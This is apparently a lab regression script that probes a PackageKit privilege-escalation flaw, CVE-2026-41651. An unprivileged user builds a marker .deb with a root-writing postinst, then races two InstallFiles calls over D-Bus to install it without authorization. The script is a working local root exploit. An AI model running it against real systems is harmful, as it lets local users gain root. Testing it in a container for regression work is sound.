#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${TARGET:-ubuntu24-server-lpe-target}"
ATTACKER="${ATTACKER:-attacker}"
ATTEMPTS="${PK41651_ATTEMPTS:-20}"

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/packagekit-cve41651-regression.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

run() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
}

run_in_target() {
  run docker exec "$TARGET" bash -lc "$1"
}

echo "PackageKit CVE-2026-41651 regression probe"
echo "target=$TARGET attacker=$ATTACKER attempts=$ATTEMPTS"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

run_in_target '
set -euo pipefail
echo "== baseline identity and package versions =="
uname -a
id attacker
id selfauth || true
dpkg-query -W -f="\${Package}\t\${Version}\t\${Architecture}\n" \
  packagekit packagekit-tools libpackagekit-glib2-18 python3-gi gir1.2-packagekitglib-1.0 polkitd dbus dbus-daemon systemd 2>&1 || true
echo
echo "== packagekit changelog head =="
zcat /usr/share/doc/packagekit/changelog.Debian.gz | sed -n "1,18p"
echo
echo "== packagekit service =="
systemctl cat packagekit.service
echo
echo "== D-Bus socket and activation =="
ls -l /run/dbus/system_bus_socket /var/run/dbus/system_bus_socket 2>/dev/null || true
busctl --system list | grep -E "org.freedesktop.(PackageKit|PolicyKit1|DBus)|polkit" || true
echo
echo "== attacker CreateTransaction reachability =="
tx=$(runuser -u attacker -- gdbus call --system \
  --dest org.freedesktop.PackageKit \
  --object-path /org/freedesktop/PackageKit \
  --method org.freedesktop.PackageKit.CreateTransaction |
  sed -n "s/.*objectpath '\''\([^'\'' ]*\)'\''.*/\1/p")
echo "attacker_tx=$tx"
runuser -u attacker -- gdbus introspect --system \
  --dest org.freedesktop.PackageKit \
  --object-path "$tx" |
  sed -n "/interface org.freedesktop.PackageKit.Transaction/,/properties:/p"
runuser -u attacker -- gdbus call --system \
  --dest org.freedesktop.PackageKit \
  --object-path "$tx" \
  --method org.freedesktop.DBus.Properties.GetAll \
  org.freedesktop.PackageKit.Transaction
'

run_in_target '
set -euo pipefail
echo "== cleanup before probe =="
pkill -TERM -u attacker -f pk41651_gi_probe.py 2>/dev/null || true
dpkg -r packagekit-cve41651-root 2>/dev/null || true
rm -rf /tmp/packagekit-cve41651 /root/packagekit_cve41651_root
'

run docker exec -i "$TARGET" runuser -u "$ATTACKER" -- bash <<'ATTACKER_BUILD'
set -Eeuo pipefail
work=/tmp/packagekit-cve41651
pkg="$work/pkg"
deb="$work/packagekit-cve41651-root.deb"
rm -rf "$work"
mkdir -p "$pkg/DEBIAN" "$pkg/usr/local/share/packagekit-cve41651"
cat > "$pkg/DEBIAN/control" <<'EOF'
Package: packagekit-cve41651-root
Version: 1.0
Section: misc
Priority: optional
Architecture: all
Maintainer: Regression Probe <root@example.invalid>
Description: CVE-2026-41651 regression marker package
EOF
cat > "$pkg/DEBIAN/postinst" <<'EOF'
#!/bin/sh
set -eu
{
  echo "packagekit-cve41651 postinst ran"
  date -Is
  id
  echo "argv=$*"
} > /root/packagekit_cve41651_root
chmod 0600 /root/packagekit_cve41651_root
exit 0
EOF
chmod 0755 "$pkg/DEBIAN/postinst"
printf 'probe payload\n' > "$pkg/usr/local/share/packagekit-cve41651/payload.txt"
dpkg-deb --build "$pkg" "$deb"
ls -l "$deb"
dpkg-deb -I "$deb"
ATTACKER_BUILD

run docker exec -i "$TARGET" runuser -u "$ATTACKER" -- bash <<'ATTACKER_PROBE'
set -Eeuo pipefail
cat > /tmp/packagekit-cve41651/pk41651_gi_probe.py <<'PY'
#!/usr/bin/env python3
import sys
import time

import gi
gi.require_version("Gio", "2.0")
from gi.repository import Gio, GLib

BUS = "org.freedesktop.PackageKit"
ROOT = "/org/freedesktop/PackageKit"
TX_IFACE = "org.freedesktop.PackageKit.Transaction"
PROPS = "org.freedesktop.DBus.Properties"
ONLY_DOWNLOAD = 8

deb = sys.argv[1]
attempts = int(sys.argv[2])
conn = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)


def call_sync(path, iface, method, params=None, timeout=5000):
    return conn.call_sync(
        BUS,
        path,
        iface,
        method,
        params,
        None,
        Gio.DBusCallFlags.NONE,
        timeout,
        None,
    )


def print_props(tx):
    try:
        ret = call_sync(
            tx,
            PROPS,
            "GetAll",
            GLib.Variant("(s)", (TX_IFACE,)),
            3000,
        )
        props = ret.unpack()[0]
        interesting = {
            key: props[key]
            for key in ("Uid", "CallerActive", "Role", "Status", "TransactionFlags")
            if key in props
        }
        print(f"  properties={interesting}", flush=True)
    except GLib.Error as exc:
        print(f"  properties_error={exc.message}", flush=True)


def signal_cb(_conn, _sender, path, _iface, signal, params, _data):
    print(f"  signal path={path} {signal} {params.unpack()}", flush=True)


def method_cb(source, result, label):
    try:
        source.call_finish(result)
        print(f"  method_reply {label}: ok", flush=True)
    except GLib.Error as exc:
        print(f"  method_reply {label}: {exc.message}", flush=True)


for attempt in range(1, attempts + 1):
    print(f"[attempt {attempt}] create transaction", flush=True)
    try:
        ret = call_sync(ROOT, "org.freedesktop.PackageKit", "CreateTransaction")
        tx = ret.unpack()[0]
        print(f"  tx={tx}", flush=True)
        print_props(tx)
        try:
            call_sync(tx, TX_IFACE, "SetHints", GLib.Variant("(as)", (["interactive=true"],)), 3000)
            print("  SetHints interactive=true: ok", flush=True)
        except GLib.Error as exc:
            print(f"  SetHints interactive=true: {exc.message}", flush=True)

        sub = conn.signal_subscribe(
            BUS,
            TX_IFACE,
            None,
            tx,
            None,
            Gio.DBusSignalFlags.NONE,
            signal_cb,
            None,
        )

        print(f"  queue InstallFiles flags={ONLY_DOWNLOAD} {deb}", flush=True)
        conn.call(
            BUS,
            tx,
            TX_IFACE,
            "InstallFiles",
            GLib.Variant("(tas)", (ONLY_DOWNLOAD, [deb])),
            None,
            Gio.DBusCallFlags.NONE,
            5000,
            None,
            method_cb,
            f"flags={ONLY_DOWNLOAD}",
        )
        print(f"  queue InstallFiles flags=0 {deb}", flush=True)
        conn.call(
            BUS,
            tx,
            TX_IFACE,
            "InstallFiles",
            GLib.Variant("(tas)", (0, [deb])),
            None,
            Gio.DBusCallFlags.NONE,
            5000,
            None,
            method_cb,
            "flags=0",
        )
        conn.flush_sync(None)

        loop = GLib.MainLoop()
        GLib.timeout_add(3500, loop.quit)
        loop.run()
        conn.signal_unsubscribe(sub)
        time.sleep(0.25)
    except GLib.Error as exc:
        print(f"  attempt_error={exc.message}", flush=True)
        time.sleep(0.5)
PY
chmod 0755 /tmp/packagekit-cve41651/pk41651_gi_probe.py
/tmp/packagekit-cve41651/pk41651_gi_probe.py /tmp/packagekit-cve41651/packagekit-cve41651-root.deb "${PK41651_ATTEMPTS:-20}"
ATTACKER_PROBE

run_in_target '
set -euo pipefail
echo "== post-probe root marker/package state =="
if test -e /root/packagekit_cve41651_root; then
  echo "ROOT_MARKER_PRESENT"
  cat /root/packagekit_cve41651_root
else
  echo "ROOT_MARKER_ABSENT"
fi
dpkg-query -W -f="\${Package}\t\${Version}\t\${Status}\n" packagekit-cve41651-root 2>&1 || true
echo
echo "== recent PackageKit/polkit journal =="
journalctl -u packagekit -u polkit --since "-10 min" --no-pager | tail -n 160 || true
'

run_in_target '
set -euo pipefail
echo "== cleanup after probe =="
dpkg -r packagekit-cve41651-root 2>/dev/null || true
rm -rf /tmp/packagekit-cve41651 /root/packagekit_cve41651_root
systemctl reset-failed packagekit.service polkit.service dbus.service 2>/dev/null || true
echo
echo "== cleanup verification =="
test ! -e /root/packagekit_cve41651_root && echo "no root marker"
test ! -e /tmp/packagekit-cve41651 && echo "no /tmp probe directory"
dpkg-query -W packagekit-cve41651-root 2>&1 || true
systemctl is-system-running || true
systemctl --failed --no-pager || true
systemctl status packagekit polkit dbus --no-pager --lines=20 || true
'

echo
echo "probe log: $LOG"
